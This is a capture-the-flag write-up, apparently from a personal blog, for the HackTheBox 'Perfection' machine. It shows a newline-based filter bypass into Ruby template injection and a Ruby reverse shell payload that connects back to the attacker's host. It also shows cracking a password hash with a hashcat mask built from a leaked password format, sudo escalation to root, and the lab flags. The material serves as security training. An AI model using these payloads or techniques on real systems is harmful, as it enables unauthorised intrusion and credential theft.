---
layout: post
title: Perfection HackTheBox Machine - Writeup
categories: [HackTheBox Machines]
tags: [hackthebox,hackthebox,easy,linux]
image:
  path: /images/htb/easy/perfection/icon.png
---

Back on the machines!

**Machine created by:** [TheHated1](https://app.hackthebox.com/users/1412009)

## Recon

Starting with a nmap scan of the IP, we see 2 open ports.

```
$ sudo nmap 10.10.11.253 -p-
...
PORT      STATE SERVICE   REASON
22/tcp    open  ssh       syn-ack ttl 127
80/tcp    open  http      syn-ack ttl 127
```

Visiting the webpage at [10.10.11.253](http://10.10.11.253:80) is a webpage for Students.

![Main Page](/images/htb/easy/perfection/main.png)

Looking at the pages, the 'Weighted Grade Calculator' catches my eye with the potential of having user input.

![Weighted Grade Calculator](/images/htb/easy/perfection/calc.png)

Which is does! Now, let's do some more recon, I have a hunch its going to be an SSTI exploit, but it always blocks symbols like `{` with `Malicious input detected`. Perhaps a CRLF? I try an input of `a%0a{hi}` and it works! So now we can inject characters that are not supposed to be there, can we get SSTI? I utilise `webtech` to see what technologies the page is running.

```
$ webtech -u "http://******"
Target URL: http://******
Detected the following interesting custom headers:
	- Server: nginx, WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
```

Ruby! 

## Exploitation

Alright, let's try a basic Ruby SSTI. I go to [PayloadAllTheThings SSTI Ruby section](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby) and use the payload `a%0a<%25=7*7%25>` as my injection and get a result of `49`!

## Initial Access/User Flag

I use a reverse shell from [revshells.com](https://www.revshells.com/) to get a connection and use a `pwncat` listener on my machine.
```
$ pwncat-cs
[16:41:49] Welcome to pwncat 🐈!
(local) pwncat$ listen --host 10.10.***.*** 4445 -m linux
[16:41:53] new listener created for 10.10.***.***:4445
(local) pwncat$
```

Payload:
```
0%0a<%25=`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.***.***",4445))'`%25>
```

Once connected I see I'm a user `susan` and I move to their home directory and read `user.txt`.

User Flag: <mark>7a676ee5984422e9068bb756751ccc5d</mark>

## Root Flag

I'm initially interested in the `Migration`, there is a database containing some user password hashes called `pupilpath_credentials.db` but after some persistence with the `rockyou.txt` list, it wouldn't budge.

I decide to get `linpeas.sh` on the system and to have a look for anything obvious that I'm missing. After executing I 

Get hash from migration folder for user: `abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f`.

Crack with hashcat didn't work. Run linpeas: 
```
[1;34m╔══════════╣ [1;32mReadable files belonging to root and readable by me but not world readable
[0m-rw-r----- 1 root susan 625 May 14  2023 [1;31m/var/mail/susan[0m
-rw-r----- 1 root susan 33 Mar 19 08:34 [1;31m/home/susan/user.txt[0m
```

Reading mail file:
```
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

Let's use a hashcat mask to do this: `hashcat -m 1400 -a 3 hash "susan_nasus_?d?d?d?d?d?d?d?d?d"`

`abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210`

Nice! Now using `sudo -l` I check for what binaries we have permissions to use with sudo, authenticating with the password we cracked.

```
$ sudo -l
[sudo] password for susan:
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
```

Very convinient! We have `sudo` permissions to every binary.

```
$ sudo /usr/bin/bash
$ cat /root/root.txt
d4bf41e46a558aaea8335743632a74be
```

Root Flag: <mark>d4bf41e46a558aaea8335743632a74be</mark>

![Success](/images/htb/easy/perfection/submitted.png)

## Thanks for reading!
Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).

You can also find my other contacts on the [whoami](../about) page.